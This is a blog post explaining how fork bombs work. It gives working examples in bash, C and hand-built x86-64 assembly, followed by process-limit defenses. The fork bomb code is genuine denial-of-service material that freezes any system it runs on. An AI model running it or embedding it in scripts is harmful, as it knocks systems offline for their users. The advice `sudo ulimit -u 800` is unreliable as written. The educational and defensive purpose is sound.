---
title: "フォークボム：その仕組みと防御策"
emoji: "💣"
type: "tech"
topics: ["security", "bash", "assembly", "linux"]
published: true
---

The first time I heard about fork bombs was a long time ago. Although I found it fascinating that a piece of code could spawn two more processes of itself, causing exponential process growth and eventually freezing the system, I didn't believe it was a viable attack until I discovered how many systems are vulnerable to code injection.

## What is a fork bomb?

In general terms, a fork bomb is code that spawns processes recursively. The first process spawns copies of itself, those copies spawn more copies, and so on, until the system runs out of resources and freezes. The result is a DoS (Denial of Service) attack.

The biggest problem is that any system that allows users to execute code in some form is vulnerable, because creating processes is an allowed operation precisely to make running programs possible. So it ends up being hard to prevent a fork bomb from running. You can limit the impact by capping the number of processes a user can create, but that doesn't stop the attack from happening and often just annoys legitimate users.

## How does a fork bomb work?

The following code is a classic example of a fork bomb in bash:

```bash
:(){ :|:& };:
```

- `:` is the function name; it could be anything.
- `(){}` defines a function.
- `:` calls the function that was just defined.
- `|` is the pipe operator (here it works like a logical 'or'); in practice it makes both parts of the command run.
- `&` puts the command in the background.
- `;` ends the command; at this point, the function has been defined but not yet called.
- `:` calls the function.

So what the bash code is doing is defining a function named `:` that calls itself twice, once in the background and once in the foreground. This makes the parent process spawn two child processes which, in turn, spawn two more child processes, and so on.

That's the pattern of a fork bomb: a parent process spawns two child processes which, in turn, spawn two more child processes, and so on.

It's possible to write a fork bomb in any language that allows creating processes. Here are two more examples, one in C and one in assembly.

```c
// gcc -o forkbomb forkbomb.c
#include <unistd.h>

int main() {
loop:
    fork();
    goto loop;
}
```

I created the example below as a challenge to write the smallest fork bomb possible; it has only 3 instructions.

```asm
global _start   ; define the entry point as '_start'
_start:
    mov rax, 57 ; syscall number for fork on x86-64 Linux
    syscall     ; execute the syscall
    jmp _start  ; infinite loop
```

The final file could be even smaller, but it wouldn't be a valid ELF executable. It would even be possible to embed the code in the header, but the most I'd gain is a few bytes, so it's not worth it.

In any case, here is the code to compile the assembly fork bomb, defining the header.

```asm
; nasm -f bin -o forkbomb_elf forkbomb_elf.asm
bits 64
            org 0x08048000
ehdr:                                   ; Elf64_Ehdr
            db  0x7F, "ELF", 2, 1, 1, 0 ;   e_ident
    times 8 db  0
            dw  2                       ;   e_type
            dw  62                      ;   e_machine
            dd  1                       ;   e_version
            dq  _start                  ;   e_entry
            dq  phdr - $$               ;   e_phoff
            dq  0                       ;   e_shoff
            dd  0                       ;   e_flags
            dw  ehdrsize                ;   e_ehsize
            dw  phdrsize                ;   e_phentsize
            dw  1                       ;   e_phnum
            dw  0                       ;   e_shentsize
            dw  0                       ;   e_shnum
            dw  0                       ;   e_shstrndx

ehdrsize    equ $ - ehdr

phdr:                                   ; Elf64_Phdr
            dd  1                       ;   p_type
            dd  5                       ;   p_flags
            dq  0                       ;   p_offset
            dq  $$                      ;   p_vaddr
            dq  $$                      ;   p_paddr
            dq  filesize                ;   p_filesz
            dq  filesize                ;   p_memsz
            dq  0x1000                  ;   p_align

phdrsize    equ     $-phdr
_start:
            mov rax, 57                 ; Syscall number for fork on x86-64 Linux
            syscall                     ; Execute the syscall
            jmp _start                  ; Jump back to the start of the loop
filesize    equ $ - $$
```
[source code](https://crg.eti.br/en/post/forkbomb-do-codigo-a-defesa/forkbomb_elf.asm)

This code should produce a 129-byte executable for an *x86-64* system, the smallest fork bomb I managed to make.

## Preventing Fork Bombs

Modern systems that use `systemd` are far less susceptible to fork bombs. `systemd` groups processes and can also limit the number of processes a user can create. But depending on the configuration, you won't even be able to log in. Processes that are already running will keep running, but the system will be very busy handling the huge number of processes. If you are logged in and try to create another process, you will get a message like `fork failed: resource temporarily unavailable`, which means you can't run any program.

The best way to limit the impact of a fork bomb is to restrict the number of processes a user can create. This can be done in the `/etc/security/limits.conf` file.

```bash
usuario hard nproc 10
```

Where `usuario` is the username and `10` is the maximum number of processes they can create. Besides limiting the number of processes a user can create, this file allows many other limit configurations. If you are interested in security, it's worth taking a look.

You can also restrict the number of processes with the `ulimit` command.

```bash
sudo ulimit -u 800
```

Limiting the number of processes works, but it also prevents legitimate users from creating many processes. So you need to find a balance.

## Conclusion

Fork bombs are simple and effective DoS attacks. Any system that allows users to execute code is vulnerable. While it's possible to limit the impact of a fork bomb, it's hard to prevent one from being executed.

Video with a fork bomb demonstration on YouTube:

https://www.youtube.com/watch?v=BNfZpqkEsUc
